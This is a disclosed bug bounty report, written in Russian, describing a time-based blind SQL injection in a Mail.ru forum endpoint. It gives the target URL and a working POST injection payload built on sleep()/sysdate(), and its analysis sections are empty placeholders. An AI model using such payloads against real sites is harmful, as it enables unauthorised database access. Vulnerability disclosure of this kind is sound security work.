---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '78443'
original_report_id: '78443'
title: Time-Based Blind SQL Injection Attacks
weakness: SQL Injection
team_handle: mailru
created_at: '2015-07-24T18:21:34.311Z'
disclosed_at: '2016-03-10T15:28:24.744Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- sql-injection
---

# Time-Based Blind SQL Injection Attacks

## Metadata

- HackerOne Report ID: 78443
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2016-03-10T15:28:24.744Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Здравствуйте, на сайте http://jh.my.com/forum/ajax/render/memberlist_items обнаружена blind sql. При отправке в POST-запросе : criteria[startwith]=if(now()=sysdate(),sleep(0),0)/*"XOR(if(now()=sysdate(),sleep(0),0))OR"*/
Сервер будет отрабатывать заданное время.
Прикрепляю скрин.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
